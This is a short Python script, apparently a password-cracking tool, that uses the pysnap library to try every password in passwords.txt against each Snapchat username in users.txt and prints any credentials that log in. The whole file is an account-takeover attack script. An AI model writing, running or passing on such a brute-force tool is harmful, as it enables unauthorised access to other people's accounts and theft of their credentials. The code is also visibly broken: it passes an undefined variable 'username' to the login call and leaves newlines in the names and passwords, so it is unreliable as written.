#!/usr/bin/env python

from pysnap import Snapchat
import sys
import os

def crack(jdrisle):
	print("now cracking: " + jdrisle)
	snapchat = Snapchat()
	passwords = open("passwords.txt","r")
	i = 0
	for password in passwords:
		result = snapchat.login(username,password)
		if (result['logged']!=False):
			print("success: username: " + jdrisle + "\t password: " + password)
			break
		else:
			print(str(i))
			i+=1

names = open("users.txt","r")
for name in names:
	crack(name)	
